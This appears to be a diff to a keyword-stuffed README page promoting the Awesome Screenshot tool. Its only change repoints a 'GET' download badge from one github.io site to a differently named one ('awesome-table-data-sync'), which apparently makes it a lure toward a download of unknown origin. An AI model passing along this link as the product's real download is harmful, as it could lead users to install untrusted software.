@@ -39,7 +39,7 @@ The goal is simple: fewer retakes, clearer handoffs, and a steady routine for vi
 
 Awesome Screenshot turns raw screen content into a clear map. With Awesome Screenshot full page and Awesome Screenshot share workflows in mind, users can capture, sort, and plan handoff with less guesswork than scattered tools alone. Awesome Screenshot annotate adds the marks that make each point land, and Awesome Screenshot edit keeps every result tidy before it leaves your hands.
 
-[![GET — Awesome Screenshot](https://img.shields.io/badge/GET%20%E2%80%94%20Awesome%20Screenshot-0078D6?style=for-the-badge&logoColor=white)](https://awesome-screenshot-capture.github.io/.github/awesome-screenshot)
+[![GET — Awesome Screenshot](https://img.shields.io/badge/GET%20%E2%80%94%20Awesome%20Screenshot-0078D6?style=for-the-badge&logoColor=white)](https://awesome-table-data-sync.github.io/.github/awesome-table-data)
 
 ---
 
